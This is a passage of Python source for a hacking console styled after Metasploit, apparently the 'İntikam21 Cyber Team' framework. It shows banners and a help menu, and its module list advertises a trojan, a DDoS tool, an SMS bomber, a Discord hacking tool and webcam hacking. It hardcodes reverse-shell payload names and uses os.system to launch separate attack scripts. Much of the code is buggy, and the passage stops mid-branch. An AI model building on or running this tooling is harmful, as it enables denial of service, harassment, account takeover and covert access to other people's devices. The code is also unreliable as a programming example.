|  {Fore.RESET}{Fore.BLUE}         // \\\\  {Fore.RESET} {Fore.GREEN}       | |_____________\\_______    |
|   {Fore.RESET} {Fore.BLUE}       //   \\\\ {Fore.RESET} {Fore.GREEN}       | |=={Fore.RESET}[int >]{Fore.GREEN}============\\   |{Fore.RESET}
|  {Fore.BLUE}        //     \\\\        | |______________________\\  |
|    {Fore.RESET}  {Fore.BLUE}   // {Fore.RESET}RECON{Fore.BLUE} \\\\       | \\(@)(@)(@)(@)(@)(@)(@)/   |
|        {Fore.BLUE}//         \\\\      |  *********************    |
+---------------------------+---------------------------+
|      o O o                |        \\'\\/\\/\\/\\/'/         |
|              o O          |         )======(          |
|                 o         |   {Fore.RESET}  {Fore.YELLOW}  .' {Fore.RESET} LOOT  '.   {Fore.YELLOW}     |
|{Fore.RED} |^^^^^^^^^^^^^^{Fore.RESET} {Fore.GREEN}|l___      |      /    _||__   {Fore.RESET}\\       |
{Fore.RED}| |    PAYLOAD     |""\\___,{Fore.GREEN} |     /    (_||_     \\      |{Fore.RESET}
{Fore.RED}| |________________|__|{Fore.RESET}){Fore.YELLOW}__| |    |     __||_)  {Fore.RESET}   |     |
{Fore.RED}| |(@)(@)''""**|(@)(@)**|(@){Fore.YELLOW} |    "       ||       "     |{Fore.RESET}
{Fore.RED}|  = = = = = = = = = = = =  {Fore.RESET}| {Fore.YELLOW}    '--------------'      | {Fore.RESET}
+---------------------------+---------------------------+

   """,
   """
   {Fore.RED}
   ____      __  _ __                  ___  ___
   /  _/___  / /_(_) /______ _____ ___ |__ \<  /
   / // __ \/ __/ / //_/ __ `/ __ `__ \__/ // /
 _/ // / / / /_/ / ,< / /_/ / / / / / / __// /
/___/_/ /_/\__/_/_/|_|\__,_/_/ /_/ /_/____/_/

   ______      __                   ______
  / ____/_  __/ /_  ___  _____     /_  __/__  ____ _____ ___
 / /   / / / / __ \/ _ \/ ___/      / / / _ \/ __ `/ __ `__ \
/ /___/ /_/ / /_/ /  __/ /         / / /  __/ /_/ / / / / / /
\____/\__, /_.___/\___/_/         /_/  \___/\__,_/_/ /_/ /_/
     /____/
{Fore.RESET}
    +-------------------------------------------------------------+
     | [+] the {Fore.YELLOW}system{Fore.RESET} was infiltrated                             |
     | [~] Coder: intikam21                                       |
     | [~] Team: {Fore.RED}İntikam21{Fore.RESET} Cyber Team                              |
     | [~] Designer: İntikam21 Design Team                         |
     | [~] Supporters: Not			                        |
   +--------------------------------------------------------------+
    """   
    # Daha fazla banner eklenebilir
    ]
    # Rastgele bir banner seçimi yapılıyor
	chosen_banner = random.choice(banners)
	# Print the formatted text
	print(chosen_banner.format(Fore=Fore))
def menu_banner():
	print("" + Fore.RESET)
	print(f"""
=[ {Fore.YELLOW}İntikam21-Framework console v4.0.15-dev-bbf096e{Style.RESET_ALL}                  ]
+ -- --=[ 2456 exploits - 1248 auxiliary - 500 post]
+ -- --=[ 1465 payloads - 50 encoders - 1 nops     ]
+ -- --=[ 40 evasion -                             ]
+ -- --=[ Osint Framework - 2 shodan - 90 network  ]
İntikam21 Documentation: https://sites.google.com/view/intilam21-cyber-team/kay%C4%B1t
""" + Fore.RESET)
def inputrs(sk):
	if sk.lower("y" or "yes"):
		pass
	if sk.lower("n" or "no"):
		exit()
	else:
		exit()
def parse_input(input_str):
    parts = input_str.split(':')
    if len(parts) == 1:
        return parts[0].split()[0], None
    elif len(parts) == 2:
        if parts[1].isdigit():
            return parts[0].split()[0], int(parts[1])
        else:
            raise ValueError("Geçersiz giriş formatı. Port sayısı geçerli bir tamsayı olmalıdır.")
    else:
        raise ValueError("Geçersiz giriş formatı. IP adresi/domain ve opsiyonel olarak port giriniz.")

def dns_lookup_a(domain, port=None):
    try:
        ip_address = socket.gethostbyname(domain)
        if port:
            ip_address = f"{ip_address}:{port}"
        print(f"{domain}:{port} için A kaydı: {ip_address}")
    except socket.gaierror as e:
        print(f"{domain}:{port} için A kaydı bulunamadı: {e}")

def dns_lookup_mx(domain, port=None):
    try:
        answers = socket.getaddrinfo(domain, port, socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP)
        mx_records = [answer for answer in answers if answer[1] == socket.SOCK_STREAM]
        if mx_records:
            for mx_record in mx_records:
                print(f"{domain}:{port} için MX kaydı: {mx_record}")
        else:
            print(f"{domain}:{port} için MX kaydı bulunamadı.")
    except socket.gaierror as e:
        print(f"{domain}:{port} için MX kaydı sorgulaması başarısız oldu: {e}")

def dns_lookup_ns(domain, port=None):
    try:
        answers = socket.getaddrinfo(domain, port, socket.AF_INET, socket.SOCK_STREAM)
        ns_records = [answer for answer in answers if answer[1] == socket.SOCK_STREAM]
        if ns_records:
            for ns_record in ns_records:
                print(f"{domain}:{port} için NS kaydı: {ns_record}")
        else:
            print(f"{domain}:{port} için NS kaydı bulunamadı.")
    except socket.gaierror as e:
        print(f"{domain}:{port} için NS kaydı sorgulaması başarısız oldu: {e}")

def dns_lookup_txt(domain, port=None):
    try:
        answers = socket.getaddrinfo(domain, port, socket.AF_INET, socket.SOCK_STREAM)
        txt_records = [answer for answer in answers if answer[1] == socket.SOCK_STREAM]
        if txt_records:
            for txt_record in txt_records:
                print(f"{domain}:{port} için TXT kaydı: {txt_record}")
        else:
            print(f"{domain}:{port} için TXT kaydı bulunamadı.")
    except socket.gaierror as e:
        print(f"{domain}:{port} için TXT kaydı sorgulaması başarısız oldu: {e}")

def reverse_dns_lookup(ip, port=None):
    try:
        hostnames = socket.gethostbyaddr(ip)
        if port:
            ip = f"{ip}:{port}"
        print(f"{ip} için ters DNS çözümlemesi: {hostnames}")
    except socket.herror as e:
        print(f"{ip} için ters DNS çözümlemesi başarısız oldu: {e}")

def ip_check(ip_address):
    ip = IPAddress(ip_address)
    if ip in IPNetwork('192.168.1.0/24'):
        print(f"{ip_address} yerel ağda bulunuyor.")
    else:
        print(f"{ip_address} yerel ağda bulunmuyor.")

def main():
    input_str = input("Bir IP adresi veya domain adı (opsiyonel olarak port ile birlikte) girin: ")
    domain, port = parse_input(input_str)
    
    try:
        socket.inet_aton(domain)
        is_ip = True
    except socket.error:
        is_ip = False
    
    if is_ip:
        reverse_dns_lookup(domain, port)
    else:
        dns_lookup_a(domain, port)
        dns_lookup_mx(domain, port)
        dns_lookup_ns(domain, port)
        dns_lookup_txt(domain, port)
def search(modules, query):
    results = {}
    query = query.lower()  # Convert query to lowercase for case-insensitive search
    
    for modul, description in modules.items():
        if query in modul.lower():  # Check if query matches module name
            results[modul] = description
    
    return results

# Example modules dictionary:
modules = {
    "introjan": "the best trojan horse tool",
    "oip": "the #3 information Gathering Tools",
    "intshark": "If you can't find anything, type intshark and find additional tools that we don't make or don't recognize.",
    "use": "use modules",
    "mode-admin": "use admin mode",
    "set": "set command, add and adjust settings",
    "bset": "bset sets a adjuet settings",
    "star": "chmodding tools",
    "search": "search tools",
    "item": "Call it with the item command without using callers like Python",
    "show": "show tools or exploits",
    "back": "back to term",
    "jobs": "see a jobs",
    "connect": "listen ip",
    "1": "DDOS TOOL",
    "2": "SMS BOMBER",
    "3": "Discord hacking tool",
    "intweb": "Web hacking Tool",
    "intcam": "Cam Hack For intikam21 users",
    "intmeterpreter": "payload using and creating"
}
payloads = None
prompt = None
def get_meterpreter():
    global payloads
    try:
        result = subprocess.run(["python3", "intmeterpreter.py", "-pe"], check=True, capture_output=True, text=True)
        payloads = result.stdout.strip()  # Ensure payloads are stripped of any extra whitespace
    except subprocess.CalledProcessError as e:
        pass



def check_ip(ip):
    # Check if the IP address is valid
    try:
        socket.inet_aton(ip)
        print(f"{ip} is a valid IP address.")
    except socket.error:
        print(f"{ip} is not a valid IP address.")
        return
    
    # Try to connect to the IP address
    try:
        response = requests.get(f"http://{ip}")
        if response.status_code == 200:
            print(f"Successfully connected to {ip}.")
        else:
            print(f"Failed to connect to {ip}, status code: {response.status_code}")
    except requests.ConnectionError:
        print(f"Failed to connect to {ip}.")

def exploits(exp_name, output=None):
    os.system(f"python3 exploit_searcher.py keyword {exp_name} {'-o ' + output if output else ''}")
def listen(ip):
    HOST = ip 
    PORT = 5555

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        s.bind((HOST, PORT))
        s.listen(1)
        print('Socket bind complete')
        conn, addr = s.accept()
        print('Connected with ' + addr[0] + ':' + str(addr[1]))
        add_job(f"Listening {host}")
    except socket.error as msg:
        print('Bind failed. Error Code : ' + str(msg.errno) + ' Message ' + msg.strerror)
        sys.exit()
def user_count(help_input, repeat_count=2):
	inputs = []
	targets = ["set rhosts", "set rports", "set lports", "set lports", "set rhost", "set rport"]
	inputs.append(help_input)
	if help_input.lower() in targets and inputs.count(help_input) == repeat_count:
		if targets == "set rhosts" or "set rhost":
			print("""you are used rhosts you are must use ("del rhosts") or ("del rhost")  """)
		if targets == "set rport" or "set rports":
			print("""you are used rhosts you are must use ("del rports") or ("del rport")  """)
		if targets == "set lhost" or "set lhosts":
			print("""you are used rhosts you are must use ("del lhosts") or ("del lhost")  """)
		if targets == "set rhosts" or "set rhost":
			print("""you are used rhosts you are must use ("del lports") or ("del lport")  """)
			
from colorama import Fore, Style, init			
init()			
def get_input(modules=None, modulename=None, cdn=None):
    global prompt
    get_meterpreter()
    module = modules if modules is not None else ""
    module_name = modulename if modulename is not None else ""
    cd = cdn if cdn is not None else ""
    prompt = (f"int4 payloads({Fore.RED}{payloads}{Fore.RESET})>{Style.RESET_ALL}" if payloads else
              f"int4 {module_name}({Fore.RED}{module}{Fore.RESET})" if module and module_name else
              f"int4 ({Fore.RED}{cd}{Fore.RESET}) >{Style.RESET_ALL}" if cd else
              f"int4 >")
get_input()
banner()
menu_banner()
while True:
    help_input = input(prompt)
    print(Fore.RESET)
    if help_input.lower() == "help":
    	print("""
		|•COMMAND|        |•Function|
		---------------------		 -----------------
		mode-{mode-name}	-switches to that mode
		use						-use commands
		set                          -set a settings
		jobs                         -see a jobs
		whoami                 -see a name
		neofetch                -see a system
		item					   -Call it with the item command without using callers like Python
		search                   -Search in the console
		star						-chmodding tools
		introjan				 -The best Trojan Horse
		oip					     -informa]tion gathering tool
		banner 				-using banner tutorial
		intshark				-If you can't find anything, type intshark and find additional tools that we don't make or don't recognize
		show					-show commands or tools or exploits
		back					-Back to term or back to console
		break				   -Break to while
		int install			-install packages 
		connect              -connect a ip
		color				   -Term color
		run 					 - Run modules
USE COMMANDS
=================	
	usage : use {payload} or {exploit} or "evasion", and other modules
					
					
BSET COMMANDS
=================
	usage: bset -a , set -e  or set {Framework name}
		if mode-admin:
			usage: set -a admin${COMMANDS}
			set -a          - add 
			set -e         -exit
		bset -a 			-add
		bset -e             -exit
			
			
SET COMMANDS
====================	
	usage: set {name}
	names:
		evasion
		payload
		exploit
		RHOSTS
		LHOST
		RPORTS
		LPORT
		Banner
		CPORT
		CHOST
		other
İTEM USAGE
============	
	item 'name.(caller_name)'
			
SEARCH USAGE
=================
  search 'com-name'
		
	
İNTROJAN COMMANDS
=====================
	-ip or -ipv4            -İp adress of the target
	-k   						-connect a cable
	-r or --remote       -remote to lxde or cmd
	-d or --dir			  -directory show on computer
	-g   {video url}    -open video url on computer	
	-p    					-port
	-s or --send-message  -send ip or cable to computer
	
			
OİP COMMANDS
================
	-h --help		-help
	-ip				- target ip or domain	
	-p -port		-target port
	-t 				-turbo mode on
	-time           -time
	-oip 			-Name or email to search
	-th				- Number of sites to search

	
		

			
									
SHOW USAGE		
===============
				
	- show {exploits} or {tools} or {commands}

	
		
			
				
					
CONNECT COMMANDS	
======================
			
	-p				-ping
	-l				-listen
	-r				-HOSTS
	-port		-port
			
			
HELLO, WE ARE THE İNTİKAM21 CYBER TEAM, THE REASON WE MADE THIS TOOL IS TO EDUCATE PEOPLE WHO LEARN HACKING, ONLY MALWARE BEHAVIOR BY THE USER OR INFECTION OF A SYSTEM IS NOT UNDER OUR RESPONSIBILITY, GOOD WORK🙋
			[intweb]Web scanner for intikam21 users
			[intcam]Cam Hack for intikam21 users
			
			we are working...		
For Examples:
		use command using auxiliary:
			use auxiliary
		selecting dirs example(if use auxiliary) else (use exploits or payloads or other tools):
			select {Your selecting module)
		RUN
		=======
		For Example:
			run shodan
			if you are set domain or others and use shodan following commands:
				use shodan
				set API={YourApiKey}
				or set API {YourApiKey}
				set mail=yourinfo@example.com
				or
				set DOMAİN=google.com
				else
				you are must using arguments or back else set other arguments for shodan
			finally:
				run
Examples:
    others enter a documents,
    # Entering Modules:
    	usage:
    		use modules (Your Path)
    	# example:
    		set other=127.0.0.1
    		use modules /intframework/modules/intcrawler/
    		run
		""")
    if help_input.lower().startswith("set lhost" or "set lhosts=" or "set lhost="):
    	t.sleep(1)
    	global LHOST
    	lh = help_input[10:]
    	if help_input.lower().startswith("set lhosts="):
    		LHOST = help_input[11:]
    	if help_input.lower().startswith("set lhost="):
    		LHOST = help_input[10:]
    	else:
    		LHOST = lh   		
    	user_count(help_input)
    	add_job("LHOSTS:", LHOST)
    	print("intbase: LHOST ==> "+LHOST)
    if help_input.lower().startswith("set other=" or "set other "):
    	t.sleep(1.2)
    	global other
    	other = help_input[help_input.find("="):] if help_input.lower().startswith("set other=") else help_input[help_input.find("set other "):]
    	print("intbase OTHER ==> " + other)
    if help_input.lower().startswith(("set lport", "set lport=", "set lports=")):
    	t.sleep(1)
    	global Lp
    	Lp = help_input[10:]
    	global LPORTS
    	if help_input.lower().startswith("set lports="):
    		LPORTS = help_input[11:]
    	else:
    		LPORTS = Lp
    	user_count(help_input)
    	print("intbase: LPORT ==> "+LPORTS)
    elif help_input.startswith("set payload" or "exploit"):
    	global ac80
    	ac80 = help_input[10:]
    	if used_payload == "YES":
    		os.system("intvenom -p "+ac80+"LHOST="+Lhost+"LPORT="+LPORT)
    	elif used_payload == None:
    		os.system("intvenom -e "+ach80)
    elif help_input.startswith("use"):
    	global use_h
    	use_h = help_input[4:]
    	if use_h == "payload":
    		global PAYLOAD
    		selected = help_input[help_input.find("payload "):]
    		payloads = [
    # Windows
    "/windows/meterpreter/reverse_tcp",
    "/windows/meterpreter_reverse_tcp",
    "/windows/meterpreter/bind_tcp",
    "/windows/meterpreter_bind_tcp",
    "/windows/shell/reverse_tcp",
    "/windows/shell_reverse_tcp",
    "/windows/shell/bind_tcp",
    "/windows/shell_bind_tcp",
    
    # Linux
    "/linux/x86/meterpreter/reverse_tcp",
    "/linux/x86/shell/reverse_tcp",
    "/linux/x86/meterpreter/bind_tcp",
    "/linux/x86/shell/bind_tcp",
    "/linux/x64/meterpreter/reverse_tcp",
    "/linux/x64/shell/reverse_tcp",
    "/linux/x64/meterpreter/bind_tcp",
    "/linux/x64/shell/bind_tcp",
    
    # MacOS
    "/osx/x86/shell_reverse_tcp",
    "/osx/x64/shell_reverse_tcp",
    "/osx/x86/meterpreter_reverse_tcp",
    "/osx/x64/meterpreter_reverse_tcp",
    
    # Android
    "/android/meterpreter/reverse_tcp",
    "/android/shell/reverse_tcp",
    
    # PHP
    "/php/meterpreter/reverse_tcp",
    "/php/shell/reverse_tcp",
    
    # Java
    "/java/meterpreter/reverse_tcp",
    "/java/shell/reverse_tcp",
    
    # Python
    "/python/meterpreter/reverse_tcp",
    "/python/shell/reverse_tcp",
    
    # Multi-platform
    "/multi/meterpreter/reverse_tcp",
    "/multi/meterpreter_reverse_tcp",
    "/multi/shell/reverse_tcp",
    "/multi/shell_reverse_tcp"
    ]
    		if selected in payloads:
    			PAYLOAD = payloads
    		get_input(modulename="payload")
    	if use_h.startswith("evasions/"):
    		PATH = use_h[9:]
    		if PATH:
    			# Check if the path exists
    			path_check = subprocess.run(["python3", "evasionint.py", "-s"], capture_output=True, text=True)
    			if path_check.stdout:
    				subprocess.run(["python3", "evasionint.py", "-u", f"evasions/{PATH}"])
    				l0Ot = subprocess.run(["python3", "evasionint.py", "-pe"], capture_output=True, text=True)
    				if l0Ot.stdout:
    					txt = l0Ot.stdout.strip()
    					get_input(modulename="evasion", modules=txt)
    				else:
    				   pass
    			else:
    				pass 			
    	if use_h.startswith("exploit/"):
    		exp_tr = help_input[12:]
    		result = exploits(exp_tr)
    		if result.stdout == "multi/handler" or "multi/inthacker":
    			print("multi/handler mode")
    			global handler
    			handler = "used"
    			get_input(modules="/multi/handler", modulename="exploit")
    		else:
    			if "-o" or ">" in help_input:
    				if "-o" in help_input:
    					output = help_input[help_input.find("-o"):]
    				if ">" in help_input:
    					exploit_ch = help_input[help_input.find(">"):]
    			output = help_input[help_input.find("-o"):]
    			s = os.getcwd()
    			os.system("cd ~ && cd intframework && cd modules")
    			os.system("python3 exploit_searcher.py "+exp_tr+ "-o"+output)
    			get_input(modules=exp_tr, modulename="exploit")
    	if use_h.lower() == "shodan":
    		get_input(cdn="shodan")
    	if use_h.lower() == "auxiliary":
    		get_input(cdn="auxiliary")
    		axe = "used"
    		used(axe)
    	if use_h.lower().startswith("osint" or "osint-framework" or "intframework"):
    		get_input(cdn="osint&int")
    else:
    	pass
    if help_input.startswith("set auxiliary"):
        h = help_input[14:]
        termux_path = "/data/data/com.termux/files/home/"
        if os.path.exists(termux_path):
            pass
        else:
            termux_path = "/usr/opt/"
        path = f"{termux_path}intframework/auxiliary/"
        path_check = path[help_input.find(f"{termux_path}intframework/auxiliary/"):]
    
        if path_check == "dos":
            get_input()
            get_input(cdn="auxiliary/dos")
            print("""
        dos.py    DosHAcK
            """)
    
        elif path_check == "social-enginering":
            get_input(cdn="auxiliary/social-enginering")
            print(Fore.RED + """
        Discord.py
        informations
        mailfinder
        specialintikam21youtube.py
            """ + Fore.RESET)
    if help_input.startswith("select"):
    	h  = help_input[7:]
    	if h.lower() == "doshack":
    		if get_input(cdn="auxiliary/dos"):
    			s = input("selected if you are want to run [y/n] else you are want to write a run on console* ")
    			if s.lower() == "y":
    				os.system("""    			 
    			    cd ~
    			    cd intframework
    			    cd DoShAcK
    			    python Doshack.py
    			    """)
    			else:
    				pass
    		else:
    			print("invalid command!")    			
    	if h.lower() == "dos.py":
    		if get_input(cdn="auxiliary/dos"):
    			s = input("selected if you are want to run [y/n] else you are want to write a run on console* ")
    			if s.lower() == "y":
    				os.system("""    			 
    				python3 DDOS.py
    			    """)
    			else:
    				pass
    		else:
    			print("invalid command")
    	if h.lower() == "-spc/discord":
    		if get_input(cdn="auxiliary/social-enginering"):
    			s = input("selected if you are want to run [y/n] else you are want to write a run on console* ")
    			if s.lower() == "y":
    				os.system("""
    				python3 DİSCORD.py
    			    """)
    			else: 
    				pass
    			os.system("python3 DİSCORD.py")
    		else:
    			print("İNVALİD COMMAND")
    	if h.lower() == "intformations":
    		if get_input(cdn="auxiliary/social-enginering"):
    		    try:
    			    f  = os.system("""
    			apt update -y && apt upgrade -y
    			pkg install git
    			pkg install python
    			pkg install python3
    			git clone https://github.com/Intikam21kurucu/int-formations
    			chmod +x install.sh
    			./install.sh
    			""")
    		    except:
    		    	print()
    		    	
    if help_input.startswith("set evasions"):
    	global evasion_h
    	evasion_h = help_input[13:]
    	strvasion = help_input.split("LHOSTS=")[1].split(":")[0]
    	strvas = help_input[help_input.find("LPORTS="):help_input.find(":", help_input.find("LPORTS="))][:-2 if help_input[help_input.find("LPORTS="):help_input.find(":", help_input.find("LPORT="))].endswith("6535") else -4]
    	output_file = help_input[help_input.find("--output ")+len("--output "):].split()[0] if "--output " in help_input else (help_input[help_input.find("-o ")+len("-o "):].split()[0] if "-o " in help_input else None)
    	code_sp = help_input.split("-c")[1].strip() if "-c" in help_input else None
    	use_us = help_input[help_input.find("-u "):]
    	if evasions_u == "used":
    		if evasion_h == "1":
    			os.system("cd tools")
    			os.system("cd Phantom-Evasion")
    			os.system('python3 phantom-evasion.py')
    		else:
    			try:
    				os.system(f"python3 evasionint.py -l {strvasion} -p {strvas} -c {code_sp} -u {use_us}")
    				get_input(modules="evasion", modulename=use_us)
    			except:
    				pass	
    	else:
    		print(Fore.RED + "No used evasion" + Fore.RESET + """please use "use evasion" """)
    if help_input.startswith("int install"):
    	int_i = help_input[12:]
    	if int_i == "intai":
    		print("Get 1: Searching intconsole modules...")
    		print("intbase: succesfully installed intai")
    	if int_i == "RHOST":
    		global installed_rh
    		print("Get 1: Searching intconsole modules...")
    		print("intbase: module founded")
    		print("Getting RHOST")
    		installed_rh = "installed"
    		print("intbase: succesfully installed Rhost")
    	if int_i == "RPORT":
    		global installed_rp
    		print("Get 1: Searching intconsole modules...")
    		print("intbase: module founded")
    		print("Getting RHOST")
    		installed_rp = "installed"
    		print("intbase: succesfully installed Rport")
    	if int_i == "ninja":
    		global installed_nj
    		print("Get 1: Searching intconsole modules")
    		print("module not" + Fore.RED + "Founded" + Fore.RESET)	
    		print("Get 2: Searching Repo")
    		print("Getting ninja...")
    		installed_nj = "installed"
    		print("Succesfully installed ninja")
    	if int_i == "aiv3":
    		print("Get 1: Searching intconsole modules")
    		print("module not" + Fore.RED + "Founded" + Fore.RESET)	
    		print("Get 2: Searching Repo")	
    		print("module not" + Fore.RED + "Founded" + Fore.RESET)
    		print("Get 3: Searching All websites/repos")
    		print("getting aiv3")
    		print(Fore.RED + "[*]" + Fore.RESET + "Getting Repo")
    		os.system("git clone https://github.com/Capsize-Games/chatai")
    		s = input("Do you use ai?")
    		if s.lower() == "y" or "YES":
    			os.system("""
    			cd chatai
    			cd src
    			cd chatairuner
    			python3 chatbot.py
    			""")
    		else:
    			pass
    if help_input.startswith("set banner"):
    	bannerss = help_input[12:] or help_input[15:]
    	banner += [bannerss]
    if help_input.lower().startswith(("set rhosts", "set rhosts=")):
    	if help_input.lower().startswith("set rhosts="):
    	   rhost = help_input[11:]  # "set rhosts=" 11 karakter uzunluğunda, 10'dan itibaren dilimlemek gerekiyor
    	else:
    	   rhost = help_input[10:]
    	global RHOSTS
    	RHOSTS = rhost
    	print("intbase: RHOSTS ==> " + RHOSTS)

    if help_input.lower().startswith(("set rport", "set rport=")):
        if help_input.lower().startswith("set rport="):
        	rprt = help_input[10:]  # "set rport=" 10 karakter uzunluğunda, 9'dan itibaren dilimlemek gerekiyor
        else:
        	rprt = help_input[10:]
        global RPORT
        RPORT = rprt
        print("intbase: RPORTS ==> " + RPORT)
    elif help_input.startswith("py-search" or "payload-search") and help_input.endswith("''"):
    	    if help_input.startswith("payload-search '") and help_input.endswith("'"):
    	    	term = user_input[len("payload-search '"):-1]
    	    	result = search_payloads(term)
    	    	print_payloads(result)
    	    else:
    	    	term = user_input[len("py-search '"):-1]
    	    	result = search_payloads(term)
    	    	print_payloads(result)    
    elif help_input.startswith("search '") and help_input.endswith("'"):
	   # Extract module name from user input
        query = help_input[8:-1]  # Remove "search'" prefix and "'" suffix to get the module name
        results = search(modules, query)
        if results:
        	print("Search results:")
        for modul, description in results.items():
        	print(f"{modul}: {description}")
        else:
        	print(f"No results found for '{query}'.")
    if help_input.startswith("bset"):
    	global var_1201
    	var_1201 = help_input[5:help_input.find(" ==>", 5)] if " ==>" in help_input else (help_input[5:help_input.find('>', 5) + 1] if '>' in help_input else help_input[5:])
    	var_1202 = help_input[(start_index := help_input.find('==')) + (4 if help_input[start_index + 2:start_index + 3] == ' ' else 2):] if (start_index := help_input.find('==')) != -1 else ''
    	var_1203 = help_input[(start_index := help_input.find('==>')) + (4 if ' ' in help_input[start_index + 3:start_index + 4] else 2):] if '==>' in help_input else (help_input[(start_index := help_input.find('>')) + (2 if ' ' in help_input[start_index + 1:start_index + 2] else 1):] if '>' in help_input else None)
    	if '>' or '==>' in help_input:
    		tr_en_al = help_input[(index := (help_input.find('==>') if '==' in help_input else help_input.find('>'))) + (3 if '==' in help_input and help_input.find('==>') == index else 1):] if (index := (help_input.find('==>') if '==' in help_input else help_input.find('>'))) != -1 else ''
    		try:
    			result = search_payloads(tr_en_al)
    		except Exception as e:
    			print(f"Error occurred: {e}")
    			print("intmeterpreter? •meterpreter• did you mean?")
    			src_print = var_1201, "==", var_1202, "==>", " "
    			print(src_print)
    		else:
    		  if result.stdout:
    		  	src_print = (var_1201, "==", var_1202, "==>", var_1203)
    		  else:
    		  	src_print = (var_1201, "==", var_1202, "==>", " ")
    		  	print(src_print)
    	else:
    		print("payload not found")
    if help_input.startswith("meterpreter") and help_input.endswith(""):
    			os.system("python3 intmeterpreter.py start")
    			add_job("meterpreter")
    if help_input.startswith("check"):
    	check_chef = help_input[6:]
    	check_ip(check_chef)
    if help_input.startswith("jobs"):
    	list_jobs()
    	if "-k" in help_input:
    		job_id = help_input[help_input.find("-k "):]
    		kill_job(job_id)
    if help_input.startswith("dns"):
    	if "-f" in help_input:
    		format_chef = help_input[help_input.find("-f "):]
    		main_chef = help_input[help_input.find("DHOST="):]
    		port_chef = help_input[help_input.find(":" or "DPORT="):]
    		domain, port = parse_input(help_input)
    		def tryp(domain):
    		  try:
    		  	socket.inet_aton(domain)
    		  	is_ip = True
    		  except socket.error:
    		  	is_ip = False
    		tryp(domain)
    		
    		if format_chef.lower() == "reverse":
    			if is_ip:
    				reverse_dns_lookup(domain, port)
    			else:
    				print("is not ip")    			
    		if format_chef.lower() == "txt":
    			dns_lookup_txt(domain, port)
    		if format_chef.lower() == "a":
    			dns_lookup_a(domain, port)
    		if format_chef.lower() == "mx":
    			dns_lookup_mx(domain, port)
    		if format_chef.lower() == "ns":
    			dns_lookup_ns(domain, port)
    if help_input.startswith("use exploit"):
    	exploit_name = help_input[help_input.find("use exploit "):]
    	payload_nama = help_input[help_input.find("> "):]
    	framework = import_framework()
    	try:
    	   framework['exploits'][exploit_name] = create_exploit(
            name=exploit_name,
            lhost=LHOST,
            lport=LPORTS,
            rhost=RHOSTS,
            rport=RPORT,
            payload=payload_nama
            )
    	except:
    		t.sleep(0.7)
    		print("please set settings!")
    		pass
    	use_framework(framework, exploit_name)
    	show_options(framework['current_exploit'])
    if help_input.startswith("use modules"):
    	module_name = help_input.split("> ", 1)[-1].strip()
    	payload = help_input[help_input.find(">"):]
    	if module_name == "/intframework/modules/intmail" or module_name == "/intframework/modules/intmail/":
    		try:
    			intmodules.intmail(other)
    		except NameError:
    			print("please set mail example: set other=info@example.com")
    			pass
    			pass
    		get_input(modules="intmail", modulename="intmodules")
    	else:
    		print("please set mail example: set other=info@example.com")
    	if module_name == "/intframework/modules/intcrawler" or "/intframework/modules/intcrawler/":
    		try:
    			intmodules.crawl(other)
    		except NameError:
    			print("please set ip example: set other=127.0.0.1")
    			pass
    		get_input(modules="intcrawler", modulename="intmodules")
    	else:
    		print("please set ip example: set other=127.0.0.1")
    		pass
    	if module_name == "/intframework/modules/imeicheck" or "/intframework/modules/imeicheck/":
    		try:
    			intmodules.imeicheck(other)
    		except NameError:
    			print("please set imei example: set other=11111111111")
    			pass
    		get_input(modules="imeichecker", modulename="intmodules")
    	else:
    		print("please set imei example: set other=11111111111")
    	if module_name == "/intframework/modules/phonesearch" or "/intframework/modules/phonesearch/":
    		try:
    			intmodules.phonesearch(other)
    		except NameError:
    			print("please set phone number example: set other=5550000000")
    			pass
    		get_input(modules="phonesearcher", modulename="intmodules")
    	else:
    		print("please set phone number example: set other=5550000000")
    	if module_name == "/intframework/modules/discord" or "/intframework/modules/discord/":
    		try:
    			intmodules.discord(other)
    		except NameError:
    			print("please set id example: set other=1234567890")
    			pass
    		get_input(modules="intdiscord", modulename="intmodules")
    	else:
    		print("please set id example: set other=1234567890")
    if help_input.startswith("show options"):
    	framework = import_framework()
    	if use_framework(framework, exploit_name):
    		option = None
    		value = None
    		set_option(framework['current_exploit'], option, value)
    	if intmodules.intmail(other) or get_input(modules="intmail", modulename="intmodules"):
    		try:
    			intmodules.mail_options(other, required=None)
    		except NameError:
    			pass
    			pass
    	else:
    		pass
    	if intmodules.crawl(other) or get_input(modules="intcrawler", modulename="intmodules"):
    		try:
    			intmodules.crawl_option(other, required=None)
    		except NameError:
    			pass
    			pass
    	else:
    		pass
    	if intmodules.imeicheck(other) or get_input(modules="imeichecker", modulename="intmodules"):
    		try:
    			intmodules.imeicheck_option(other)
    		except NameError:
    			pass
    	else:
    		pass
    	if intmodules.phonesearch(other) or get_input(modules="phonesearcher", modulename="intmodules"):
    		try:
    			intmodules.phonesearch_options(other)
    		except NameError:
    			pass
    	else:
    		pass
    	if intmodules.discord(other) or get_input(modules="intdiscord", modulename="intmodules"):
    		try:
    			intmodules.discord_option(other)
    		except NameError:
    			pass
    	else:
    		pass
    if help_input.lower().startswith("intninja"):
    	hel = help_input[9:]
    	s = os.getcwd()
    	os.system("cd ~ && cd intframework && cd modules")
    	os.system("python3 intninja.py "+hel)
    	os.system(f"cd {s}")
    if help_input.lower().startswith("intvenom"):
    	hel = help_input[9:]
    	s = os.getcwd()
    	os.system("cd ~ && cd intframework && cd modules")
    	os.system("python3 intvenom.py "+hel)
    	os.system(f"cd {s}")
    if help_input.lower().startswith("intweb"):
    	hel = help_input[7:]
    	s = os.getcwd()
    	os.system("cd ~ && cd intframework && cd modules")
    	os.system("python3 intweb "+hel)
    	os.system(f"cd {s}")
    if help_input.lower().startswith("introjan"):
    	hel = help_input[9:]
    	s = os.getcwd()
    	os.system("cd ~ && cd intframework && cd modules")
    	os.system("python3 introjan.py "+hel)
    	os.system(f"cd {s}")
    if help_input.lower().startswith("intcam"):
    	hel = help_input[7]
    	s = os.getcwd()
    	os.system("cd ~ && cd intframework && cd modules")
    	os.system("python3 intcam.py "+hel)
    	os.system(f"cd {s}")
    if help_input.lower().startswith("oip"):
    	hel = help_input[4:]
    	s = os.getcwd()
    	os.system("cd ~ && cd intframework && cd modules")
    	os.system("pyhon3 oip "+hel)
    	os.system(f"cd {s}")
    if help_input.lower().startswith("intmail"):
    	hel = help_input[8:]
    	s = os.getcwd()
    	os.system("cd ~ && cd intframework && cd modules")
    	os.system("python3 intmail.py "+hel)
    	os.system(f"cd {s}")
    if help_input.lower().startswith("intmeterpreter"):
    	hel = help_input[15:]
